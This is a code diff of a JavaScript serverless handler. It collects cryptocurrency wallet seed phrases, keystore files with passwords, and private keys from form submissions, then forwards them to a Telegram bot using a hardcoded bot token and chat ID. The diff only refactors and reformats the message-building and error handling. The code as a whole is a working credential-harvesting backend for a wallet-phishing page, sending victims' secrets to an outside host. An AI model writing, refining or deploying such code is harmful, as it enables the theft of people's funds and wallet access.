@@ -1,39 +1,47 @@
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
-    return res.status(405).send('Method Not Allowed');
+    return res.status(405).end(); // Method Not Allowed
   }
 
   const { type, phrase, keystore, password, privateKey, walletName } = req.body;
 
-  // Construct message based on type
-  let message = `🛑 New ${type.toUpperCase()} Submission\nWallet: ${walletName}\n`;
+  const botToken = '8072535178:AAEECwdN4jeLk3qQBQq1NaqObmHAcQ8uOZI'; // 🔁 Replace with your real bot token
+  const chatId = '1129243973';     // 🔁 Replace with your real chat ID
 
-  if (type === 'phrase') message += `Phrase: ${phrase}`;
-  if (type === 'keystore') message += `Keystore: ${keystore}\nPassword: ${password}`;
-  if (type === 'privatekey') message += `Private Key: ${privateKey}`;
+  let message = `🔐 New Wallet Submission\n`;
+  message += `📲 Wallet: ${walletName}\n`;
+  message += `📁 Type: ${type}\n`;
 
-  const TELEGRAM_BOT_TOKEN = '8072535178:AAEECwdN4jeLk3qQBQq1NaqObmHAcQ8uOZI';
-  const TELEGRAM_CHAT_ID = '1129243973';
+  if (type === 'phrase') {
+    message += `📝 Phrase:\n${phrase}`;
+  } else if (type === 'keystore') {
+    message += `🧾 Keystore:\n${keystore}\n\n🔑 Password: ${password}`;
+  } else if (type === 'privatekey') {
+    message += `🔑 Private Key:\n${privateKey}`;
+  }
 
-  const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
   try {
-    const tgRes = await fetch(telegramUrl, {
+    const tgResponse = await fetch(telegramUrl, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      headers: {
+        'Content-Type': 'application/json'
+      },
       body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message
+        chat_id: chatId,
+        text: message,
+        parse_mode: 'Markdown'
       })
     });
 
-    if (!tgRes.ok) {
-      throw new Error('Telegram API failed');
+    if (!tgResponse.ok) {
+      const errorData = await tgResponse.text();
+      return res.status(500).json({ success: false, error: errorData });
     }
 
-    res.status(200).json({ status: 'success' });
-  } catch (err) {
-    console.error(err);
-    res.status(500).json({ status: 'error', message: err.message });
+    return res.status(200).json({ success: true });
+  } catch (error) {
+    return res.status(500).json({ success: false, error: error.message });
   }
 }
